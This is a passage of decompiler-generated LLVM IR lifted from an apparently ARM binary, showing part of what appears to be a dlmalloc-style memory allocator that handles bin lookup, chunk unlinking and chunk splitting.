  %v7_c808 = icmp eq i32 %v1_c7fc, 15
  %v2_c80c = xor i1 %v7_c808, true
  %v3_c80c = and i1 %v2_c808, %v2_c80c
  br i1 %v3_c80c, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_c7fc
  %v5_c80c = and i32 %v1_c7fc, -8
  store i32 %v5_c80c, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_c7fc, %bb
  %v4_c810 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_c810, i32* @r0, align 4
  %v1_c814 = inttoptr i32 %v4_c810 to i32*
  %v2_c814 = load i32, i32* %v1_c814, align 4
  store i32 %v2_c814, i32* @r4, align 4
  %v2_c818 = xor i1 %v2_c808, true
  %v3_c818 = or i1 %v7_c808, %v2_c818
  br i1 %v3_c818, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_c81c = urem i32 %v2_c814, 2
  %v2_c81c = icmp eq i32 %v1_c81c, 0
  br i1 %v2_c81c, label %dec_label_pc_c824, label %dec_label_pc_c834

dec_label_pc_c824:                                ; preds = %bb140
  %v2_c824 = icmp eq i32 %v2_c814, 0
  br i1 %v2_c824, label %dec_label_pc_c82c, label %dec_label_pc_cc10

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c824
  %v0_c82c = call i32 @function_d2a4()
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cc10

dec_label_pc_c834:                                ; preds = %bb140
  %v0_c834 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_c834, %v2_c814
  br i1 %tmp201, label %dec_label_pc_c85c, label %dec_label_pc_c83c

dec_label_pc_c83c:                                ; preds = %dec_label_pc_c834
  %v1_c83c = add i32 %v4_c810, -4
  store i32 %v1_c83c, i32* %r1.global-to-local, align 4
  %v3_c840 = udiv i32 %v0_c834, 8
  store i32 %v3_c840, i32* %r2.global-to-local, align 4
  %v4_c844 = mul nuw i32 %v3_c840, 4
  %v5_c844 = add i32 %v4_c844, %v1_c83c
  %v6_c844 = inttoptr i32 %v5_c844 to i32*
  %v7_c844 = load i32, i32* %v6_c844, align 4
  store i32 %v7_c844, i32* %r0.global-to-local, align 4
  %v2_c848 = icmp eq i32 %v7_c844, 0
  br i1 %v2_c848, label %dec_label_pc_c85c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c83c
  %v2_c84c = add i32 %v7_c844, 8
  %v3_c84c = inttoptr i32 %v2_c84c to i32*
  %v4_c84c = load i32, i32* %v3_c84c, align 4
  store i32 %v4_c84c, i32* %r3.global-to-local, align 4
  store i32 %v2_c84c, i32* %r0.global-to-local, align 4
  store i32 %v2_c84c, i32* %r4.global-to-local, align 4
  store i32 %v4_c84c, i32* %v6_c844, align 4
  br label %dec_label_pc_d064

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c83c, %dec_label_pc_c834
  %tmp202 = icmp ugt i32 %v0_c834, 255
  br i1 %tmp202, label %dec_label_pc_c8ac, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c85c
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_c86c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  %v3_c870 = udiv i32 %v0_c834, 8
  store i32 %v3_c870, i32* @r7, align 4
  %v4_c874 = mul nuw i32 %v3_c870, 8
  %v5_c874 = add i32 %v4_c86c, %v4_c874
  store i32 %v5_c874, i32* %r3.global-to-local, align 4
  %v1_c878 = add i32 %v5_c874, 44
  store i32 %v1_c878, i32* %ip.global-to-local, align 4
  %v1_c87c = add i32 %v5_c874, 56
  %v2_c87c = inttoptr i32 %v1_c87c to i32*
  %v3_c87c = load i32, i32* %v2_c87c, align 4
  store i32 %v3_c87c, i32* %r0.global-to-local, align 4
  %v9_c880 = icmp eq i32 %v3_c87c, %v1_c878
  br i1 %v9_c880, label %dec_label_pc_ca0c, label %dec_label_pc_c888

dec_label_pc_c888:                                ; preds = %dec_label_pc_c864
  %v2_c888 = add i32 %v3_c87c, %v0_c834
  store i32 %v2_c888, i32* %r3.global-to-local, align 4
  %v1_c88c = add i32 %v2_c888, 4
  %v2_c88c = inttoptr i32 %v1_c88c to i32*
  %v3_c88c = load i32, i32* %v2_c88c, align 4
  store i32 %v3_c88c, i32* %r2.global-to-local, align 4
  %v1_c890 = add i32 %v3_c87c, 12
  %v2_c890 = inttoptr i32 %v1_c890 to i32*
  %v3_c890 = load i32, i32* %v2_c890, align 4
  store i32 %v3_c890, i32* %r1.global-to-local, align 4
  %v1_c894 = or i32 %v3_c88c, 1
  store i32 %v1_c894, i32* %r2.global-to-local, align 4
  %v1_c898 = add i32 %v3_c87c, 8
  store i32 %v1_c898, i32* %r4.global-to-local, align 4
  store i32 %v1_c894, i32* %v2_c88c, align 4
  %v0_c8a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_c8a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c8a0 = add i32 %v1_c8a0, 8
  %v3_c8a0 = inttoptr i32 %v2_c8a0 to i32*
  store i32 %v0_c8a0, i32* %v3_c8a0, align 4
  %v0_c8a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8a4 = load i32, i32* %ip.global-to-local, align 4
  %v2_c8a4 = add i32 %v1_c8a4, 12
  %v3_c8a4 = inttoptr i32 %v2_c8a4 to i32*
  store i32 %v0_c8a4, i32* %v3_c8a4, align 4
  br label %dec_label_pc_d064

dec_label_pc_c8ac:                                ; preds = %dec_label_pc_c85c
  store i32 %v0_c834, i32* %r0.global-to-local, align 4
  %v1_c8b0 = call i32 @function_c704(i32 %v0_c834)
  store i32 %v1_c8b0, i32* %r0.global-to-local, align 4
  %v0_c8b4 = load i32, i32* @r4, align 4
  %v1_c8b4 = and i32 %v0_c8b4, 2
  %v2_c8b4 = icmp eq i32 %v1_c8b4, 0
  store i32 %v1_c8b0, i32* @r7, align 4
  br i1 %v2_c8b4, label %dec_label_pc_ca0c, label %dec_label_pc_c8c0

dec_label_pc_c8c0:                                ; preds = %dec_label_pc_c8ac
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r1.global-to-local, align 4
  %v4_c8c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_c8c8, i32* @r0, align 4
  %v0_c8cc = call i32 @function_d2a4()
  store i32 %v0_c8cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ca0c

dec_label_pc_c8d4:                                ; preds = %dec_label_pc_ca20
  %v1_c8d4 = add i32 %v3_ca20, 4
  %v2_c8d4 = inttoptr i32 %v1_c8d4 to i32*
  %v3_c8d4 = load i32, i32* %v2_c8d4, align 4
  store i32 %v3_c8d4, i32* %r3.global-to-local, align 4
  %v0_c8d8 = load i32, i32* @sl, align 4
  %v1_c8dc = and i32 %v3_c8d4, -4
  store i32 %v1_c8dc, i32* %r4.global-to-local, align 4
  %v1_c8e0 = add i32 %v3_ca20, 12
  %v2_c8e0 = inttoptr i32 %v1_c8e0 to i32*
  %v3_c8e0 = load i32, i32* %v2_c8e0, align 4
  store i32 %v3_c8e0, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_c8d8, 255
  br i1 %tmp203, label %dec_label_pc_c93c, label %dec_label_pc_c8e8

dec_label_pc_c8e8:                                ; preds = %dec_label_pc_c8d4
  %v9_c8e8 = icmp eq i32 %v3_c8e0, %v0_c940
  br i1 %v9_c8e8, label %dec_label_pc_c8f0, label %dec_label_pc_c93c

dec_label_pc_c8f0:                                ; preds = %dec_label_pc_c8e8
  %v0_c8f0 = load i32, i32* @sb, align 4
  %v1_c8f0 = add i32 %v0_c8f0, 48
  %v2_c8f0 = inttoptr i32 %v1_c8f0 to i32*
  %v3_c8f0 = load i32, i32* %v2_c8f0, align 4
  store i32 %v3_c8f0, i32* %r3.global-to-local, align 4
  %v9_c8f4 = icmp eq i32 %v3_ca20, %v3_c8f0
  br i1 %v9_c8f4, label %dec_label_pc_c8fc, label %dec_label_pc_c93c

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8f0
  %v1_c8fc = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_c8dc, %v1_c8fc
  br i1 %tmp204, label %dec_label_pc_c904, label %dec_label_pc_c93c

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8fc
  %v2_c904 = sub i32 %v1_c8dc, %v0_c8d8
  store i32 %v2_c904, i32* %r2.global-to-local, align 4
  %v2_c908 = add i32 %v0_c8d8, %v3_ca20
  store i32 %v2_c908, i32* %r3.global-to-local, align 4
  %v1_c90c = or i32 %v0_c8d8, 1
  store i32 %v1_c90c, i32* %r0.global-to-local, align 4
  %v1_c910 = or i32 %v2_c904, 1
  store i32 %v1_c910, i32* %r1.global-to-local, align 4
  %v1_c914 = add i32 %v3_ca20, 8
  store i32 %v1_c914, i32* %r4.global-to-local, align 4
  %v2_c918 = add i32 %v0_c940, 8
  %v3_c918 = inttoptr i32 %v2_c918 to i32*
  store i32 %v2_c908, i32* %v3_c918, align 4
  %v0_c91c = load i32, i32* %r3.global-to-local, align 4
  %v1_c91c = load i32, i32* %ip.global-to-local, align 4
  %v2_c91c = add i32 %v1_c91c, 12
  %v3_c91c = inttoptr i32 %v2_c91c to i32*
  store i32 %v0_c91c, i32* %v3_c91c, align 4
  %v0_c920 = load i32, i32* %r0.global-to-local, align 4
  %v1_c920 = load i32, i32* @r6, align 4
  %v2_c920 = add i32 %v1_c920, 4
  %v3_c920 = inttoptr i32 %v2_c920 to i32*
  store i32 %v0_c920, i32* %v3_c920, align 4
  %v0_c924 = load i32, i32* %r3.global-to-local, align 4
  %v1_c924 = load i32, i32* @sb, align 4
  %v2_c924 = add i32 %v1_c924, 48
  %v3_c924 = inttoptr i32 %v2_c924 to i32*
  store i32 %v0_c924, i32* %v3_c924, align 4
  %v0_c928 = load i32, i32* %r2.global-to-local, align 4
  %v1_c928 = load i32, i32* %r3.global-to-local, align 4
  %v3_c928 = add i32 %v1_c928, %v0_c928
  %v4_c928 = inttoptr i32 %v3_c928 to i32*
  store i32 %v0_c928, i32* %v4_c928, align 4
  %v0_c92c = load i32, i32* %r1.global-to-local, align 4
  %v1_c92c = load i32, i32* %r3.global-to-local, align 4
  %v2_c92c = add i32 %v1_c92c, 4
  %v3_c92c = inttoptr i32 %v2_c92c to i32*
  store i32 %v0_c92c, i32* %v3_c92c, align 4
  %v0_c930 = load i32, i32* %ip.global-to-local, align 4
  %v1_c930 = load i32, i32* %r3.global-to-local, align 4
  %v2_c930 = add i32 %v1_c930, 12
  %v3_c930 = inttoptr i32 %v2_c930 to i32*
  store i32 %v0_c930, i32* %v3_c930, align 4
  %v0_c934 = load i32, i32* %ip.global-to-local, align 4
  %v1_c934 = load i32, i32* %r3.global-to-local, align 4
  %v2_c934 = add i32 %v1_c934, 8
  %v3_c934 = inttoptr i32 %v2_c934 to i32*
  store i32 %v0_c934, i32* %v3_c934, align 4
  br label %dec_label_pc_d064

dec_label_pc_c93c:                                ; preds = %dec_label_pc_c8fc, %dec_label_pc_c8f0, %dec_label_pc_c8e8, %dec_label_pc_c8d4
  %v9_c93c = icmp eq i32 %v1_c8dc, %v0_c8d8
  %v2_c940 = add i32 %v3_c8e0, 8
  %v3_c940 = inttoptr i32 %v2_c940 to i32*
  store i32 %v0_c940, i32* %v3_c940, align 4
  %v0_c944 = load i32, i32* %ip.global-to-local, align 4
  %v1_c944 = load i32, i32* %r5.global-to-local, align 4
  %v2_c944 = add i32 %v1_c944, 12
  %v3_c944 = inttoptr i32 %v2_c944 to i32*
  store i32 %v0_c944, i32* %v3_c944, align 4
  br i1 %v9_c93c, label %dec_label_pc_ca9c.loopexit, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %dec_label_pc_c93c
  %v0_c958 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_c958, 255
  br i1 %tmp205, label %dec_label_pc_c97c, label %dec_label_pc_c960

dec_label_pc_c960:                                ; preds = %dec_label_pc_c958
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  %v1_c964 = load i32, i32* %r8.global-to-local, align 4
  %v2_c964 = add i32 %v1_c964, ptrtoint (i32* @global_var_1d280.213 to i32)
  %v3_c964 = inttoptr i32 %v2_c964 to i32*
  %v4_c964 = load i32, i32* %v3_c964, align 4
  %v3_c968 = udiv i32 %v0_c958, 8
  store i32 %v3_c968, i32* %r0.global-to-local, align 4
  %v4_c96c = mul nuw i32 %v3_c968, 8
  %v5_c96c = add i32 %v4_c964, %v4_c96c
  store i32 %v5_c96c, i32* %r3.global-to-local, align 4
  %v1_c970 = add i32 %v5_c96c, 44
  store i32 %v1_c970, i32* %ip.global-to-local, align 4
  %v1_c974 = add i32 %v5_c96c, 52
  %v2_c974 = inttoptr i32 %v1_c974 to i32*
  %v3_c974 = load i32, i32* %v2_c974, align 4
  store i32 %v3_c974, i32* @lr, align 4
  br label %dec_label_pc_c9d4

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c958
  store i32 %v0_c958, i32* %r0.global-to-local, align 4
  %v1_c980 = call i32 @function_c704(i32 %v0_c958)
  store i32 %v1_c980, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %ip.global-to-local, align 4
  %v1_c988 = load i32, i32* %r8.global-to-local, align 4
  %v2_c988 = add i32 %v1_c988, ptrtoint (i32* @global_var_1d280.213 to i32)
  %v3_c988 = inttoptr i32 %v2_c988 to i32*
  %v4_c988 = load i32, i32* %v3_c988, align 4
  %v4_c98c = mul i32 %v1_c980, 8
  %v5_c98c = add i32 %v4_c988, %v4_c98c
  store i32 %v5_c98c, i32* %r3.global-to-local, align 4
  %v1_c990 = add i32 %v5_c98c, 44
  store i32 %v1_c990, i32* %ip.global-to-local, align 4
  %v1_c994 = add i32 %v5_c98c, 52
  %v2_c994 = inttoptr i32 %v1_c994 to i32*
  %v3_c994 = load i32, i32* %v2_c994, align 4
  store i32 %v3_c994, i32* @lr, align 4
  %v9_c998 = icmp eq i32 %v3_c994, %v1_c990
  br i1 %v9_c998, label %dec_label_pc_c9d4, label %dec_label_pc_c9a0

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c97c
  %v1_c9a0 = add i32 %v5_c98c, 56
  %v2_c9a0 = inttoptr i32 %v1_c9a0 to i32*
  %v3_c9a0 = load i32, i32* %v2_c9a0, align 4
  store i32 %v3_c9a0, i32* %r1.global-to-local, align 4
  %v1_c9a4 = add i32 %v3_c9a0, 4
  %v2_c9a4 = inttoptr i32 %v1_c9a4 to i32*
  %v3_c9a4 = load i32, i32* %v2_c9a4, align 4
  store i32 %v3_c9a4, i32* %r3.global-to-local, align 4
  %v0_c9a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c9a8 = icmp ult i32 %v0_c9a8, %v3_c9a4
  br i1 %v3_c9a8, label %.thread, label %dec_label_pc_c9c4.preheader

.thread:                                          ; preds = %dec_label_pc_c9a0
  store i32 %v1_c990, i32* @lr, align 4
  store i32 %v3_c9a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c9d4

dec_label_pc_c9c4.preheader:                      ; preds = %dec_label_pc_c9a0
  %v2_c9b0 = or i32 %v0_c9a8, 1
  store i32 %v2_c9b0, i32* %r2.global-to-local, align 4
  %v1_c9c4179 = add i32 %v3_c994, 4
  %v2_c9c4180 = inttoptr i32 %v1_c9c4179 to i32*
  %v3_c9c4181 = load i32, i32* %v2_c9c4180, align 4
  store i32 %v3_c9c4181, i32* %r3.global-to-local, align 4
  %v3_c9c8183 = icmp ult i32 %v2_c9b0, %v3_c9c4181
  br i1 %v3_c9c8183, label %dec_label_pc_c9c0, label %dec_label_pc_c9d0

dec_label_pc_c9c0:                                ; preds = %dec_label_pc_c9c4.preheader, %dec_label_pc_c9c0
  %v0_c9d0184 = phi i32 [ %v3_c9c0, %dec_label_pc_c9c0 ], [ %v3_c994, %dec_label_pc_c9c4.preheader ]
  %v1_c9c0 = add i32 %v0_c9d0184, 8
  %v2_c9c0 = inttoptr i32 %v1_c9c0 to i32*
  %v3_c9c0 = load i32, i32* %v2_c9c0, align 4
  store i32 %v3_c9c0, i32* @lr, align 4
  %v1_c9c4 = add i32 %v3_c9c0, 4
  %v2_c9c4 = inttoptr i32 %v1_c9c4 to i32*
  %v3_c9c4 = load i32, i32* %v2_c9c4, align 4
  store i32 %v3_c9c4, i32* %r3.global-to-local, align 4
  %v3_c9c8 = icmp ult i32 %v2_c9b0, %v3_c9c4
  br i1 %v3_c9c8, label %dec_label_pc_c9c0, label %dec_label_pc_c9d0

dec_label_pc_c9d0:                                ; preds = %dec_label_pc_c9c0, %dec_label_pc_c9c4.preheader
  %v0_c9d0.lcssa = phi i32 [ %v3_c994, %dec_label_pc_c9c4.preheader ], [ %v3_c9c0, %dec_label_pc_c9c0 ]
  %v1_c9d0 = add i32 %v0_c9d0.lcssa, 12
  %v2_c9d0 = inttoptr i32 %v1_c9d0 to i32*
  %v3_c9d0 = load i32, i32* %v2_c9d0, align 4
  store i32 %v3_c9d0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c9d4

dec_label_pc_c9d4:                                ; preds = %.thread, %dec_label_pc_c97c, %dec_label_pc_c960, %dec_label_pc_c9d0
  %v0_c9f4 = phi i32 [ %v1_c990, %dec_label_pc_c97c ], [ %v1_c970, %dec_label_pc_c960 ], [ %v3_c9d0, %dec_label_pc_c9d0 ], [ %v3_c9a0, %.thread ]
  %v0_c9e8 = phi i32 [ %v1_c980, %dec_label_pc_c97c ], [ %v3_c968, %dec_label_pc_c960 ], [ %v1_c980, %dec_label_pc_c9d0 ], [ %v1_c980, %.thread ]
  %v1_c9d8 = phi i32 [ %v1_c988, %dec_label_pc_c97c ], [ %v1_c964, %dec_label_pc_c960 ], [ %v1_c988, %dec_label_pc_c9d0 ], [ %v1_c988, %.thread ]
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  %v2_c9d8 = add i32 %v1_c9d8, ptrtoint (i32* @global_var_1d280.213 to i32)
  %v3_c9d8 = inttoptr i32 %v2_c9d8 to i32*
  %v4_c9d8 = load i32, i32* %v3_c9d8, align 4
  %v3_c9dc = sdiv i32 %v0_c9e8, 32
  store i32 %v3_c9dc, i32* %r3.global-to-local, align 4
  %v4_c9e0 = mul nsw i32 %v3_c9dc, 4
  %v5_c9e0 = add i32 %v4_c9d8, %v4_c9e0
  store i32 %v5_c9e0, i32* %r1.global-to-local, align 4
  %v1_c9e4 = add i32 %v5_c9e0, 820
  %v2_c9e4 = inttoptr i32 %v1_c9e4 to i32*
  %v3_c9e4 = load i32, i32* %v2_c9e4, align 4
  %v1_c9e8 = urem i32 %v0_c9e8, 32
  store i32 %v1_c9e8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_c9f0 = shl i32 1, %v1_c9e8
  %v8_c9f0 = or i32 %v3_c9e4, %v7_c9f0
  store i32 %v8_c9f0, i32* %r3.global-to-local, align 4
  %v1_c9f4 = load i32, i32* @r6, align 4
  %v2_c9f4 = add i32 %v1_c9f4, 12
  %v3_c9f4 = inttoptr i32 %v2_c9f4 to i32*
  store i32 %v0_c9f4, i32* %v3_c9f4, align 4
  %v0_c9f8 = load i32, i32* @lr, align 4
  %v1_c9f8 = load i32, i32* @r6, align 4
  %v2_c9f8 = add i32 %v1_c9f8, 8
  %v3_c9f8 = inttoptr i32 %v2_c9f8 to i32*
  store i32 %v0_c9f8, i32* %v3_c9f8, align 4
  %v0_c9fc = load i32, i32* %r3.global-to-local, align 4
  %v1_c9fc = load i32, i32* %r1.global-to-local, align 4
  %v2_c9fc = add i32 %v1_c9fc, 820
  %v3_c9fc = inttoptr i32 %v2_c9fc to i32*
  store i32 %v0_c9fc, i32* %v3_c9fc, align 4
  %v0_ca00 = load i32, i32* @r6, align 4
  %v1_ca00 = load i32, i32* @lr, align 4
  %v2_ca00 = add i32 %v1_ca00, 12
  %v3_ca00 = inttoptr i32 %v2_ca00 to i32*
  store i32 %v0_ca00, i32* %v3_ca00, align 4
  %v0_ca04 = load i32, i32* @r6, align 4
  %v1_ca04 = load i32, i32* %ip.global-to-local, align 4
  %v2_ca04 = add i32 %v1_ca04, 8
  %v3_ca04 = inttoptr i32 %v2_ca04 to i32*
  store i32 %v0_ca04, i32* %v3_ca04, align 4
  %v0_ca20.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ca20

dec_label_pc_ca0c:                                ; preds = %dec_label_pc_c864, %dec_label_pc_c8ac, %dec_label_pc_c8c0
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r1.global-to-local, align 4
  %v4_ca14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_ca14, i32* @sb, align 4
  %v0_ca18 = load i32, i32* @sl, align 4
  %v1_ca18 = add i32 %v0_ca18, 16
  store i32 %v1_ca18, i32* @fp, align 4
  %v1_ca1c = add i32 %v4_ca14, 52
  store i32 %v1_ca1c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ca20

dec_label_pc_ca20:                                ; preds = %dec_label_pc_c9d4, %dec_label_pc_ca0c
  %v0_c940 = phi i32 [ %v0_ca20.pre, %dec_label_pc_c9d4 ], [ %v1_ca1c, %dec_label_pc_ca0c ]
  %v1_ca20 = add i32 %v0_c940, 12
  %v2_ca20 = inttoptr i32 %v1_ca20 to i32*
  %v3_ca20 = load i32, i32* %v2_ca20, align 4
  store i32 %v3_ca20, i32* @r6, align 4
  %v9_ca24 = icmp eq i32 %v3_ca20, %v0_c940
  br i1 %v9_ca24, label %dec_label_pc_ca2c, label %dec_label_pc_c8d4

dec_label_pc_ca2c:                                ; preds = %dec_label_pc_ca20
  %v0_ca2c = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_ca2c, 256
  %v0_cae4.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_ca2c.dec_label_pc_cae4_crit_edge, label %dec_label_pc_ca34

dec_label_pc_ca2c.dec_label_pc_cae4_crit_edge:    ; preds = %dec_label_pc_ca2c
  %.pre200 = mul i32 %v0_cae4.pre, 8
  br label %dec_label_pc_cae4

dec_label_pc_ca34:                                ; preds = %dec_label_pc_ca2c
  %v4_ca34 = mul i32 %v0_cae4.pre, 8
  %v5_ca34 = add i32 %v4_ca34, %v0_c940
  store i32 %v5_ca34, i32* %r3.global-to-local, align 4
  %v1_ca38 = add i32 %v5_ca34, -8
  store i32 %v1_ca38, i32* %r1.global-to-local, align 4
  %v1_ca3c = add i32 %v5_ca34, 4
  %v2_ca3c = inttoptr i32 %v1_ca3c to i32*
  %storemerge.pre = load i32, i32* %v2_ca3c, align 4
  br label %dec_label_pc_cadc

dec_label_pc_ca44:                                ; preds = %dec_label_pc_cadc
  %v1_ca44 = add i32 %v1_ca6c, 4
  %v2_ca44 = inttoptr i32 %v1_ca44 to i32*
  %v3_ca44 = load i32, i32* %v2_ca44, align 4
  store i32 %v3_ca44, i32* %r3.global-to-local, align 4
  %v1_ca48 = and i32 %v3_ca44, -4
  store i32 %v1_ca48, i32* %r2.global-to-local, align 4
  %v3_ca4c = icmp ult i32 %v1_ca48, %v0_ca2c
  %v1_ca50 = add i32 %v1_ca6c, 12
  %v2_ca50 = inttoptr i32 %v1_ca50 to i32*
  %v3_ca50 = load i32, i32* %v2_ca50, align 4
  store i32 %v3_ca50, i32* %r0.global-to-local, align 4
  br i1 %v3_ca4c, label %dec_label_pc_cadc, label %dec_label_pc_ca58

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca44
  %v1_ca58 = add i32 %v1_ca6c, 8
  %v2_ca58 = inttoptr i32 %v1_ca58 to i32*
  %v3_ca58 = load i32, i32* %v2_ca58, align 4
  store i32 %v3_ca58, i32* %r1.global-to-local, align 4
  %v1_ca5c = add i32 %v3_ca58, 12
  %v2_ca5c = inttoptr i32 %v1_ca5c to i32*
  %v3_ca5c = load i32, i32* %v2_ca5c, align 4
  store i32 %v3_ca5c, i32* %r3.global-to-local, align 4
  %v9_ca60 = icmp eq i32 %v3_ca5c, %v1_ca6c
  br i1 %v9_ca60, label %dec_label_pc_ca68, label %dec_label_pc_ca74

dec_label_pc_ca68:                                ; preds = %dec_label_pc_ca58
  %v1_ca68 = add i32 %v3_ca50, 8
  %v2_ca68 = inttoptr i32 %v1_ca68 to i32*
  %v3_ca68 = load i32, i32* %v2_ca68, align 4
  store i32 %v3_ca68, i32* %r3.global-to-local, align 4
  %v9_ca6c = icmp eq i32 %v3_ca68, %v1_ca6c
  br i1 %v9_ca6c, label %dec_label_pc_ca78, label %dec_label_pc_ca74

dec_label_pc_ca74:                                ; preds = %dec_label_pc_ca58, %dec_label_pc_ca68
  %v0_ca74 = call i32 @function_d6d4()
  store i32 %v0_ca74, i32* %r0.global-to-local, align 4
  %v0_ca78.pre = load i32, i32* @sl, align 4
  %v1_ca78.pre = load i32, i32* @r2, align 4
  %v0_ca80.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_ca78

dec_label_pc_ca78:                                ; preds = %dec_label_pc_ca68, %dec_label_pc_ca74
  %v1_ca80 = phi i32 [ %v3_ca50, %dec_label_pc_ca68 ], [ %v0_ca74, %dec_label_pc_ca74 ]
  %v0_ca80 = phi i32 [ %v3_ca58, %dec_label_pc_ca68 ], [ %v0_ca80.pre, %dec_label_pc_ca74 ]
  %v1_ca78 = phi i32 [ %v1_ca48, %dec_label_pc_ca68 ], [ %v1_ca78.pre, %dec_label_pc_ca74 ]
  %v0_ca78 = phi i32 [ %v0_ca2c, %dec_label_pc_ca68 ], [ %v0_ca78.pre, %dec_label_pc_ca74 ]
  %v2_ca78 = sub i32 %v1_ca78, %v0_ca78
  store i32 %v2_ca78, i32* %lr.global-to-local, align 4
  %v2_ca80 = add i32 %v1_ca80, 8
  %v3_ca80 = inttoptr i32 %v2_ca80 to i32*
  store i32 %v0_ca80, i32* %v3_ca80, align 4
  %v0_ca84 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca84 = load i32, i32* %r1.global-to-local, align 4
  %v2_ca84 = add i32 %v1_ca84, 12
  %v3_ca84 = inttoptr i32 %v2_ca84 to i32*
  store i32 %v0_ca84, i32* %v3_ca84, align 4
  %v0_ca88 = load i32, i32* %ip.global-to-local, align 4
  %v1_ca88 = add i32 %v0_ca88, 8
  store i32 %v1_ca88, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_ca78, 15
  br i1 %tmp207, label %dec_label_pc_caa8, label %dec_label_pc_ca90

dec_label_pc_ca90:                                ; preds = %dec_label_pc_ca78
  %v1_ca90 = load i32, i32* %r2.global-to-local, align 4
  %v2_ca90 = add i32 %v1_ca90, %v0_ca88
  store i32 %v2_ca90, i32* %r2.global-to-local, align 4
  %v1_ca94 = add i32 %v2_ca90, 4
  %v2_ca94 = inttoptr i32 %v1_ca94 to i32*
  %v3_ca94 = load i32, i32* %v2_ca94, align 4
  store i32 %v3_ca94, i32* %r3.global-to-local, align 4
  store i32 %v1_ca88, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca9c

dec_label_pc_ca9c.loopexit:                       ; preds = %dec_label_pc_c93c
  %v1_c948 = load i32, i32* @r6, align 4
  %v2_c948 = load i32, i32* @sl, align 4
  %v3_c948 = add i32 %v2_c948, %v1_c948
  store i32 %v3_c948, i32* %r2.global-to-local, align 4
  %v2_c94c = add i32 %v3_c948, 4
  %v3_c94c = inttoptr i32 %v2_c94c to i32*
  %v4_c94c = load i32, i32* %v3_c94c, align 4
  store i32 %v4_c94c, i32* %r3.global-to-local, align 4
  %v2_c950 = add i32 %v1_c948, 8
  store i32 %v2_c950, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca9c

dec_label_pc_ca9c:                                ; preds = %.dec_label_pc_ca9c_crit_edge, %dec_label_pc_ca9c.loopexit, %dec_label_pc_ca90
  %v1_caa0 = phi i32 [ %v4_cbc4, %.dec_label_pc_ca9c_crit_edge ], [ %v3_c948, %dec_label_pc_ca9c.loopexit ], [ %v2_ca90, %dec_label_pc_ca90 ]
  %v0_ca9c = phi i32 [ %v7_cbc4, %.dec_label_pc_ca9c_crit_edge ], [ %v4_c94c, %dec_label_pc_ca9c.loopexit ], [ %v3_ca94, %dec_label_pc_ca90 ]
  %v1_ca9c = or i32 %v0_ca9c, 1
  store i32 %v1_ca9c, i32* %r3.global-to-local, align 4
  %v2_caa0 = add i32 %v1_caa0, 4
  %v3_caa0 = inttoptr i32 %v2_caa0 to i32*
  store i32 %v1_ca9c, i32* %v3_caa0, align 4
  br label %dec_label_pc_d064

dec_label_pc_caa8:                                ; preds = %dec_label_pc_ca78
  %v1_caa8 = load i32, i32* @sl, align 4
  %v2_caa8 = add i32 %v1_caa8, %v0_ca88
  store i32 %v2_caa8, i32* %r2.global-to-local, align 4
  %v1_caac = or i32 %v1_caa8, 1
  store i32 %v1_caac, i32* %r3.global-to-local, align 4
  %v0_cab0 = load i32, i32* %lr.global-to-local, align 4
  %v1_cab0 = or i32 %v0_cab0, 1
